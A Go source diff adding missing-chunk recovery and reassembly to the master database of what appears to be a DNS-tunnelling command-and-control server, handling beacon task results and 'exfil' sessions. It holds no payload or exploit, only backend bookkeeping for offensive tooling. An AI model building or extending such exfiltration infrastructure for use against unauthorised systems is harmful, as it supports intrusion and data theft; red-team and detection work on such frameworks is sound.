@@ -284,6 +284,280 @@ func (d *MasterDatabase) getPendingCompletion(taskID string) (string, int, bool)
 	return beaconID.String, totalChunks, true
 }
 
+// MissingChunkRequest represents a request for missing chunks from a DNS server
+type MissingChunkRequest struct {
+	Type         string `json:"type"`          // "task" or "exfil"
+	ID           string `json:"id"`            // task_id or session_id
+	TotalChunks  int    `json:"total_chunks"`
+	MissingChunks []int `json:"missing_chunks"`
+}
+
+// GetPendingMissingChunks returns tasks/exfils waiting for missing chunks
+// These are sessions where completion was signaled but not all chunks received
+func (d *MasterDatabase) GetPendingMissingChunks(maxAge time.Duration) ([]MissingChunkRequest, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	var requests []MissingChunkRequest
+	cutoff := time.Now().Add(-maxAge).Unix()
+
+	// Get pending task completions with missing chunks
+	taskRows, err := d.db.Query(`
+		SELECT ptc.task_id, ptc.total_chunks
+		FROM pending_task_completions ptc
+		WHERE ptc.created_at > ?
+	`, cutoff)
+	if err != nil {
+		return nil, fmt.Errorf("failed to query pending task completions: %w", err)
+	}
+	defer taskRows.Close()
+
+	for taskRows.Next() {
+		var taskID string
+		var totalChunks int
+		if err := taskRows.Scan(&taskID, &totalChunks); err != nil {
+			continue
+		}
+
+		// Get which chunks we have
+		missingChunks := d.getMissingTaskChunks(taskID, totalChunks)
+		if len(missingChunks) > 0 {
+			requests = append(requests, MissingChunkRequest{
+				Type:          "task",
+				ID:            taskID,
+				TotalChunks:   totalChunks,
+				MissingChunks: missingChunks,
+			})
+		}
+	}
+
+	// Get pending exfil completions with missing chunks
+	exfilRows, err := d.db.Query(`
+		SELECT pec.session_id, pec.total_chunks
+		FROM pending_exfil_completions pec
+		WHERE pec.created_at > ?
+	`, cutoff)
+	if err != nil {
+		return requests, nil // Return task requests even if exfil query fails
+	}
+	defer exfilRows.Close()
+
+	for exfilRows.Next() {
+		var sessionID string
+		var totalChunks int
+		if err := exfilRows.Scan(&sessionID, &totalChunks); err != nil {
+			continue
+		}
+
+		// Get which chunks we have for this exfil session
+		missingChunks := d.getMissingExfilChunks(sessionID, totalChunks)
+		if len(missingChunks) > 0 {
+			requests = append(requests, MissingChunkRequest{
+				Type:          "exfil",
+				ID:            sessionID,
+				TotalChunks:   totalChunks,
+				MissingChunks: missingChunks,
+			})
+		}
+	}
+
+	return requests, nil
+}
+
+// getMissingTaskChunks returns which chunk indices are missing for a task
+func (d *MasterDatabase) getMissingTaskChunks(taskID string, totalChunks int) []int {
+	// Get all chunk indices we have
+	rows, err := d.db.Query(`
+		SELECT DISTINCT chunk_index FROM task_result_chunks
+		WHERE task_id = ?
+		ORDER BY chunk_index
+	`, taskID)
+	if err != nil {
+		return nil
+	}
+	defer rows.Close()
+
+	haveChunks := make(map[int]bool)
+	for rows.Next() {
+		var idx int
+		if err := rows.Scan(&idx); err == nil {
+			haveChunks[idx] = true
+		}
+	}
+
+	// Find missing chunks (1-indexed)
+	var missing []int
+	for i := 1; i <= totalChunks; i++ {
+		if !haveChunks[i] {
+			missing = append(missing, i)
+		}
+	}
+
+	return missing
+}
+
+// getMissingExfilChunks returns which chunk indices are missing for an exfil session
+func (d *MasterDatabase) getMissingExfilChunks(sessionID string, totalChunks int) []int {
+	// Get all chunk indices we have
+	rows, err := d.db.Query(`
+		SELECT DISTINCT chunk_index FROM exfil_chunks
+		WHERE session_id = ?
+		ORDER BY chunk_index
+	`, sessionID)
+	if err != nil {
+		return nil
+	}
+	defer rows.Close()
+
+	haveChunks := make(map[int]bool)
+	for rows.Next() {
+		var idx int
+		if err := rows.Scan(&idx); err == nil {
+			haveChunks[idx] = true
+		}
+	}
+
+	// Find missing chunks (1-indexed)
+	var missing []int
+	for i := 1; i <= totalChunks; i++ {
+		if !haveChunks[i] {
+			missing = append(missing, i)
+		}
+	}
+
+	return missing
+}
+
+// ReceiveMissingChunks processes missing chunks sent by a DNS server
+func (d *MasterDatabase) ReceiveMissingChunks(taskID string, chunks map[int][]byte, dnsServerID string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	for chunkIndex, data := range chunks {
+		_, err := d.db.Exec(`
+			INSERT OR IGNORE INTO task_result_chunks 
+			(task_id, chunk_index, chunk_data, dns_server_id, received_at)
+			VALUES (?, ?, ?, ?, ?)
+		`, taskID, chunkIndex, data, dnsServerID, time.Now().Unix())
+		if err != nil {
+			return fmt.Errorf("failed to save chunk %d: %w", chunkIndex, err)
+		}
+	}
+
+	// Check if we now have all chunks and can complete
+	_, totalChunks, hasPending := d.getPendingCompletionUnlocked(taskID)
+	if hasPending {
+		count := 0
+		d.db.QueryRow(`SELECT COUNT(*) FROM task_result_chunks WHERE task_id = ?`, taskID).Scan(&count)
+		if count >= totalChunks {
+			// All chunks received, trigger reassembly
+			go func() {
+				d.mutex.Lock()
+				defer d.mutex.Unlock()
+				d.reassembleTaskResultUnlocked(taskID, totalChunks)
+				d.clearPendingCompletionUnlocked(taskID)
+			}()
+		}
+	}
+
+	return nil
+}
+
+// getPendingCompletionUnlocked is the unlocked version for internal use
+func (d *MasterDatabase) getPendingCompletionUnlocked(taskID string) (string, int, bool) {
+	var beaconID sql.NullString
+	var totalChunks int
+	err := d.db.QueryRow(`
+		SELECT beacon_id, total_chunks
+		FROM pending_task_completions
+		WHERE task_id = ?
+	`, taskID).Scan(&beaconID, &totalChunks)
+
+	if err != nil {
+		return "", 0, false
+	}
+	return beaconID.String, totalChunks, true
+}
+
+// clearPendingCompletionUnlocked removes pending completion tracking (must hold mutex)
+func (d *MasterDatabase) clearPendingCompletionUnlocked(taskID string) {
+	d.db.Exec(`DELETE FROM pending_task_completions WHERE task_id = ?`, taskID)
+}
+
+// reassembleTaskResultUnlocked attempts to reassemble a task result (must hold mutex)
+func (d *MasterDatabase) reassembleTaskResultUnlocked(taskID string, totalChunks int) {
+	// Get all chunks in order
+	rows, err := d.db.Query(`
+		SELECT chunk_data FROM task_result_chunks
+		WHERE task_id = ?
+		ORDER BY chunk_index ASC
+	`, taskID)
+	if err != nil {
+		fmt.Printf("[Master DB] Failed to get chunks for reassembly: %v\n", err)
+		return
+	}
+	defer rows.Close()
+
+	var result []byte
+	for rows.Next() {
+		var chunk []byte
+		if err := rows.Scan(&chunk); err == nil {
+			result = append(result, chunk...)
+		}
+	}
+
+	// Store assembled result
+	now := time.Now().Unix()
+	_, err = d.db.Exec(`
+		INSERT OR REPLACE INTO task_results (task_id, result, completed_at)
+		VALUES (?, ?, ?)
+	`, taskID, result, now)
+	if err != nil {
+		fmt.Printf("[Master DB] Failed to store reassembled result: %v\n", err)
+		return
+	}
+
+	// Update task status
+	d.db.Exec(`UPDATE tasks SET status = 'completed' WHERE id = ?`, taskID)
+	fmt.Printf("[Master DB] ✓ Reassembled task %s from missing chunks (%d bytes)\n", taskID, len(result))
+}
+
+// ReceiveMissingExfilChunks processes missing exfil chunks sent by a DNS server
+func (d *MasterDatabase) ReceiveMissingExfilChunks(sessionID string, chunks map[int][]byte, dnsServerID string) error {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	for chunkIndex, data := range chunks {
+		_, err := d.db.Exec(`
+			INSERT OR IGNORE INTO exfil_chunks 
+			(session_id, chunk_index, data, dns_server_id, received_at)
+			VALUES (?, ?, ?, ?, ?)
+		`, sessionID, chunkIndex, data, dnsServerID, time.Now().Unix())
+		if err != nil {
+			return fmt.Errorf("failed to save exfil chunk %d: %w", chunkIndex, err)
+		}
+	}
+
+	// Check if we now have all chunks and can complete
+	var totalChunks int
+	err := d.db.QueryRow(`
+		SELECT total_chunks FROM pending_exfil_completions WHERE session_id = ?
+	`, sessionID).Scan(&totalChunks)
+	
+	if err == nil && totalChunks > 0 {
+		var count int
+		d.db.QueryRow(`SELECT COUNT(DISTINCT chunk_index) FROM exfil_chunks WHERE session_id = ?`, sessionID).Scan(&count)
+		if count >= totalChunks {
+			// All chunks received - trigger reassembly via exfil completion
+			fmt.Printf("[Master DB] ✓ All %d exfil chunks received for session %s from missing chunk recovery\n", totalChunks, sessionID)
+			// Clear pending completion - actual assembly happens via normal exfil flow
+			d.db.Exec(`DELETE FROM pending_exfil_completions WHERE session_id = ?`, sessionID)
+		}
+	}
+
+	return nil
+}
+
 // migration1InitialSchema creates the initial master database schema
 func (d *MasterDatabase) migration1InitialSchema() error {
 	schema := `
